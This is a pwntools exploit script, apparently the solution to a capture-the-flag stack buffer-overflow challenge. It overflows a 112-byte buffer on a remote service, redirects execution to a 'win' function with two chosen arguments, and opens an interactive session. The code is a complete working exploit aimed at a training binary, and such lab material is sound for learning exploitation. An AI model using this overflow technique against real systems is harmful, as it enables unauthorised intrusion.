from pwn import *
import sys


#____________________________RETRIEVING THE HOST AND PORT AT ENTRY__________________

if len(sys.argv) != 3 :
    print('[-] Usage : python3 exploit.py <HOST> <PORT>')
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

#___________________________________________________________________________________



#__________________________________The files and binaries needed________________

elf = ELF('./vuln')
#context.arch = "amd32"

#______________________________________________________________________________




#________________________________CONNECTING TO THE SERVER_____________________

p  = remote(host,port)
p.recvuntil(b"Please enter your string")
log.info("[+] Crafting Payload")

#_____________________________________________________________________________



#__________________________ADDRESSES NEEDED FOR PAYLOAD_______________________

padding = 'A'*112           #padding with which we overflow the buffer
win = elf.symbols["win"]    # padding stopped at the eip(return address register) to overflow it win address
arg1 = 0xCAFEF00D           # value of the first argument of the win function
arg2 = 0xF00DF00D           #value fo the second argument of the win function

#______________________________________________________________________________



#__________________________BUILDING THE PAYLOAD________________________________

payload = padding.encode()
payload += p32(win)
payload += p32(0)
payload += p32(arg1)
payload += p32(arg2)

#______________________________________________________________________________



#_______________________SENDING THE PAYLOAD TO THE SERVER______________________

log.info("[+] sending payload to the remote server")
p.sendline(payload)
p.recv()

#______________________________________________________________________________



p.interactive()
